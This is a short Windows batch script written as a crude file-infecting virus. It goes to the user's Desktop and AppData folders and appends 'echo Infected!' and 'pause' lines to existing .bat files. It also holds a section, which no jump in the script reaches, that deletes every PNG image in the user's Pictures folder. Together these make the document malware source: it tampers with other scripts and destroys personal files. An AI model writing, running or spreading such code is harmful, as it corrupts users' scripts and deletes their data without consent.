@echo off
cd %USERPROFILE%\Desktop
goto X

:scan
cd  %appdata%
goto ext

:X
if exist *.bat goto write
if not exist *.bat goto scan

:write
for /f "delims=" %%a in ('dir /b *.bat') do set "fileList=%%a"
for %%i in (%fileList%) do echo echo Infected! >> %%i
for %%i in (%fileList%) do echo pause >> %%i
goto scan

:ext
for /f "delims=" %%a in ('dir /b *.bat') do set "fileList=%%a"
for %%i in (%fileList%) do echo echo Infected! >> %%i
for %%i in (%fileList%) do echo pause >> %%i
exit

:pict
cd %USERPROFILE%\Pictures
for /f "delims=" %%a in ('dir /b *.png') do set "fileList=%%a"
for %%i in (%fileList%) do del %%i

